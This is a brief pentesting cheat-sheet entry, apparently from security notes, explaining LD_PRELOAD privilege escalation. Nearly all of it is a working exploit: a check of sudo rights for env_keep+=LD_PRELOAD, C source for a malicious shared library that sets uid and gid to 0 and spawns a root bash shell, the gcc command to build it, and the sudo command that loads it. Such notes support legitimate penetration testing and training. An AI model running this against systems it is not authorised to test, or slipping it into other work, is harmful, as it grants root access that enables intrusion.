# Shared Libraries

### LD\_PRELOAD Privilege Escalation

The LD\_PRELOAD environment variable lets us give a shared library to run the program with

```shellscript
# Check if the env_keep+=LD_PRELOAD is in sudo 
sudo -l

# Write an exploit 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

# Compile as a shared library
gcc -fPIC -shared -o root.so root.c -nostartfiles

# Run the given sudo command with the library 
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
